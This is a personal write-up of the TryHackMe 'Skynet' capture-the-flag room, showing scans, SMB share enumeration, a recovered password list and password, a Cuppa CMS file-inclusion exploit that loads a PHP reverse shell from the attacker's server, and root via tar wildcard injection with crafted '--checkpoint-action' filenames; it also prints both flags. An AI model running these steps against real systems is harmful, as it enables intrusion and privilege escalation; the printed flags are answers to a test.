---
title: "Skynet"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - linux
  - challenege
status: "Done"
difficulty: "Easy"
date: 2026-06-03
url: "https://tryhackme.com/room/skynet"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: 374759b927518016990ec54893737a5c
---

# Skynet

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Nmap Scan

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan 10.48.168.128
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-03 20:18 +0530
Nmap scan report for 10.48.168.128
Host is up (0.049s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.16 seconds
                                                                                          
```

## Recon

## Fuzzing Directories

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ ffuf -u http://10.48.168.128/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.168.128/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4406ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5072ms]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 58ms]
ai                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 43ms]
config                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 73ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 49ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 40ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 39ms]
squirrelmail            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 57ms]
:: Progress: [20481/20481] :: Job [1/1] :: 896 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
                                                                                                                                                                                                              
```

## Enumerating Samba

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ smbmap -H 10.48.168.128

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.48.168.128:445       Name: 10.48.168.128             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
[*] Closed 1 connections                                                                                                     

┌──(exp10i73r㉿kali)-[~/nmap]
└─$ smbclient -N -L \\\\10.48.168.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
        
        
                                                                                                                                                                                                                 
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ smbclient -N //10.48.168.128/anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 21:34:00 2020
  ..                                  D        0  Tue Sep 17 12:50:17 2019
  attention.txt                       N      163  Wed Sep 18 08:34:59 2019
  logs                                D        0  Wed Sep 18 10:12:16 2019

                9204224 blocks of size 1024. 5829172 blocks available
smb: \> get attention.txt 
getting file \attention.txt of size 163 as attention.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ ls
attention.txt  nmap_full_scan.gnmap  nmap_full_scan.nmap  nmap_full_scan.xml
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
     
        
```


## Finding Password

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ smbclient -N //10.48.168.128/anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 21:34:00 2020
  ..                                  D        0  Tue Sep 17 12:50:17 2019
  attention.txt                       N      163  Wed Sep 18 08:34:59 2019
  logs                                D        0  Wed Sep 18 10:12:16 2019

                9204224 blocks of size 1024. 5829172 blocks available
smb: \> cd logs\
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 10:12:16 2019
  ..                                  D        0  Thu Nov 26 21:34:00 2020
  log2.txt                            N        0  Wed Sep 18 10:12:13 2019
  log1.txt                            N      471  Wed Sep 18 10:11:59 2019
  log3.txt                            N        0  Wed Sep 18 10:12:16 2019

                9204224 blocks of size 1024. 5829172 blocks available
smb: \logs\> prompt
smb: \logs\> mget *
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \logs\log1.txt of size 471 as log1.txt (3.5 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \logs\> exit
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ ls
attention.txt  log1.txt  log2.txt  log3.txt  nmap_full_scan.gnmap  nmap_full_scan.nmap  nmap_full_scan.xml
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ cat log2.txt
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ cat log3.txt
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~/nmap]

```

## Logging in

Tried Logging in but of No use

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_20-37-10.png]]

## Exploiting the CVE { This wasn’t the CVE }

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_20-42-18.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_20-42-51.png]]

## Corrected the mistake and logged in

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_21-00-30.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_21-02-22.png]]

```bash
)s{A&2Z=F^n_E.B`
```

## SMB login

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ smbclient  //10.48.168.128/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 14:35:47 2019
  ..                                  D        0  Wed Sep 18 09:21:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 14:35:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 14:35:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 14:35:14 2019
  notes                               D        0  Tue Sep 17 14:48:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 14:35:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 14:35:14 2019

                9204224 blocks of size 1024. 5829108 blocks available
smb: \> cd notes\
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 14:48:40 2019
  ..                                  D        0  Tue Sep 17 14:35:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 14:31:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 14:31:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 14:31:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 14:31:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 14:31:29 2019
  important.txt                       N      117  Tue Sep 17 14:48:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 14:31:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 14:31:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 14:31:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 14:31:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 14:31:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 14:31:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 14:31:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 14:31:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 14:31:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 14:31:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 14:31:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 14:31:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 14:31:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 14:31:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 14:31:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 14:31:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 14:31:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 14:31:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 14:31:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 14:31:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 14:31:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 14:31:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 14:31:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 14:31:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 14:31:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 14:31:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 14:31:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 14:31:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 14:31:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 14:31:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 14:31:29 2019

                9204224 blocks of size 1024. 5829108 blocks available
smb: \notes\> get important.txt 
getting file \notes\important.txt of size 117 as important.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \notes\> 

┌──(exp10i73r㉿kali)-[~/nmap]
└─$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

                                                                             
```

## Exploring Website

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_21-29-38.png]]

## Fuzzing Miles Dyson personal page

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ ffuf -u http://10.48.168.128/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.168.128/45kra24zxs28v3yd/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 328ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2298ms]
administrator           [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 29ms]
:: Progress: [20481/20481] :: Job [1/1] :: 938 req/sec :: Duration: [0:00:45] :: Errors: 0 ::

```

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_21-33-38.png]]

## Using searchsploit

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ searchsploit "cuppa"                               
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                             | php/webapps/25971.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_21-37-57.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Skynet/Screenshot_2026-06-03_at_21-40-06.png]]

## Obtaining Shell

```bash
┌──(exp10i73r㉿kali)-[~]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~]
└─$ nano php-reverse-shell.php 
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~]
└─$ nano php-reverse-shell.php
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                                                              
┌──(exp10i73r㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.48.168.128 - - [03/Jun/2026 21:45:04] "GET /php-reverse-shell.php HTTP/1.0" 200 -

```

## User Flag

```bash
www-data@skynet:/home/milesdyson/share$ cd /home/milesdyson/
www-data@skynet:/home/milesdyson$ ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cat user.txt 
7ce5c2109a40f958099283600a9ae807
www-data@skynet:/home/milesdyson$ ^C

```

## Root Flag

```bash
bash-4.3# ls backups/
backup.sh  backup.tgz
bash-4.3# cat backups/backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

www-data@skynet:/var/www/html$ echo 'chmod u+s /bin/bash' > shell.sh
www-data@skynet:/var/www/html$ chmod +x shell.sh
www-data@skynet:/var/www/html$ touch -- '--checkpoint=1'
www-data@skynet:/var/www/html$ touch -- '--checkpoint-action=exec=sh shell.sh'
www-data@skynet:/var/www/html$ ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun  3 11:25 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     0 Jun  3 11:25 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun  3 11:25 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data    20 Jun  3 11:25 shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-rw-rw- 1 www-data www-data     0 Jun  3 11:25 test
www-data@skynet:/var/www/html$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
www-data@skynet:/var/www/html$ /bin/bash -p
bash-4.3# ls
--checkpoint-action=exec=sh shell.sh  admin   css         js         test
--checkpoint=1                        ai      image.png   shell.sh
45kra24zxs28v3yd                      config  index.html  style.css
bash-4.3# cat /root/root.txt 
3f0372db24753accc7179a282cd6a949
bash-4.3# 

```
